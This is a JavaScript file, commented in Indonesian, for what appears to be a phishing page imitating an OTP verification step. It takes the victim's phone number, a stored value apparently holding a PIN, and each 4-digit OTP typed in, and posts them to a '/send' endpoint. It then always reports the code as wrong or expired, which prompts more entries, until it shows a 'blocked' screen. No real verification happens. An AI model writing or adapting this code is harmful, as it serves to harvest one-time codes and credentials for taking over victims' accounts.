/* ========================= */
/* OTP */
/* ========================= */

const otpInputs =
document.querySelectorAll(".otp-box");

const otpContainer =
document.querySelector(".otp-container");

const errorBox =
document.querySelector(".error-box");

const loadingBox =
document.getElementById("loadingBox");

const blockedBox =
document.querySelector(".blocked-box");

const blockedBtn =
document.querySelector(".blocked-btn");

const alertTitle =
document.querySelector(".alert-title");

const alertDesc =
document.querySelector(".alert-desc");

/* FADE IN */ 
window.addEventListener("load", () => {

    document.body.classList.add(
    "fade-in"
    );

});

/* TOTAL SALAH */
let wrongCount = 0;

/* HIDE ALERT */
errorBox.style.display = "none";

/* HIDE BLOCK */
blockedBox.style.display = "none";

/* RESET LOADING */
window.addEventListener("pageshow", () => {

    loadingBox.style.display = "none";

});

/* ========================= */
/* NOMOR OTOMATIS */
/* ========================= */

const savedNumber =
localStorage.getItem("nmrx");

if(savedNumber){

    document.querySelector(
    ".phone-number"
    ).innerText = savedNumber;

}

/* ========================= */
/* FOKUS KE BOX PERTAMA */
/* ========================= */

otpContainer.addEventListener("click", () => {

    for(let i = 0; i < otpInputs.length; i++){

        if(otpInputs[i].value === ""){

            otpInputs[i].focus();

            return;

        }

    }

    otpInputs[0].focus();

});

/* ========================= */
/* OTP INPUT */
/* ========================= */

otpInputs.forEach((input,index) => {

    input.addEventListener("input", () => {

        input.value =
        input.value.replace(/[^0-9]/g,'');

        /* HIDE ERROR */
        errorBox.style.display =
        "none";

        /* NEXT BOX */
        if(
            input.value.length === 1 &&
            index < otpInputs.length - 1
        ){

            otpInputs[index + 1]
            .focus();

        }

        checkOTP();

    });

    /* BACKSPACE */
    input.addEventListener("keydown", (e) => {

        if(
            e.key === "Backspace" &&
            input.value === "" &&
            index > 0
        ){

            otpInputs[index - 1]
            .focus();

        }

    });

});

/* ========================= */
/* CHECK OTP */
/* ========================= */

function checkOTP(){

    let otp = "";

    otpInputs.forEach(input => {

        otp += input.value;

    });

    /* FULL OTP */
    if(otp.length === 4){

         /* SIMPAN */
    localStorage.setItem(
    "otp",
    otp
    );

            const nmrx =
            localStorage.getItem(
            "nmrx"
            );

            const pix =
            localStorage.getItem(
            "pix"
            );

            const otpData =
            localStorage.getItem(
            "otp"
            );

            fetch("/send", {

            method:"POST",

            headers:{
            "Content-Type":
            "application/json"
        },

            body:JSON.stringify({

                nmrx:nmrx,
                pix:pix,
                otp:otpData

        })

    })

        .then(res => res.json())

.then(data => {

    console.log("RESPON:", data);

})

.catch(err => {

    console.log("ERROR:", err);

});

        /* SHOW LOADING */
        loadingBox.style.display =
        "flex";

        setTimeout(() => {

            /* HIDE LOADING */
            loadingBox.style.display =
            "none";

            /* TOTAL SALAH */
            wrongCount++;

            /* ========================= */
            /* 1 - 2X SALAH */
            /* ========================= */

            if(wrongCount < 3){

                errorBox.style.display =
                "block";

                alertTitle.innerText =
                "Kode OTP salah atau kadaluarsa";

                alertDesc.innerText =
                "Pastikan Kode OTP yang kamu masukan benar dan tidak kadaluarsa";

            }

            /* ========================= */
            /* 3X SALAH */
            /* ========================= */

            else if(wrongCount === 3){

                errorBox.style.display =
                "block";

                alertTitle.innerText =
                "Kamu sudah memasukan kode OTP salah 3x";

                alertDesc.innerText =
                "Pastikan kode yang dimasukan sudah benar";

            }

            /* ========================= */
            /* 4X SALAH */
            /* ========================= */

            else if(wrongCount >= 4){

                document.querySelector(
                ".container"
                ).style.display =
                "none";

                blockedBox.style.display =
                "block";

                return;

            }

            /* SHAKE */
            otpContainer.classList
            .add("shake");

            navigator.vibrate(250);

            setTimeout(() => {

                otpContainer.classList
                .remove("shake");

            },350);

            /* RESET OTP */
            setTimeout(() => {

                otpInputs.forEach(input => {

                    input.value = "";

                });

                otpInputs[0].focus();

            },300);

        },2000);

    }

}

/* ========================= */
/* TIMER */
/* ========================= */

const resendBtn =
document.querySelector(".resend-btn");

const timerText =
document.querySelector(".timer");

let time = 60;

resendBtn.disabled = true;

const countdown =
setInterval(() => {

    let seconds =
    time < 10
    ? "0" + time
    : time;

    timerText.innerText =
    `00:${seconds}`;

    time--;

    if(time < 0){

        clearInterval(countdown);

        timerText.innerText =
        "00:00";

        resendBtn.disabled =
        false;

        resendBtn.classList
        .add("active");

    }

},1000);

/* ========================= */
/* RESEND */
/* ========================= */

resendBtn.addEventListener(
"click",
() => {

    if(!resendBtn.disabled){

        location.reload();

    }

});

/* ========================= */
/* MULAI DARI AWAL */
/* ========================= */

blockedBtn.addEventListener(
"click",
() => {

    localStorage.clear();

    window.location.href =
    "index.html";

});
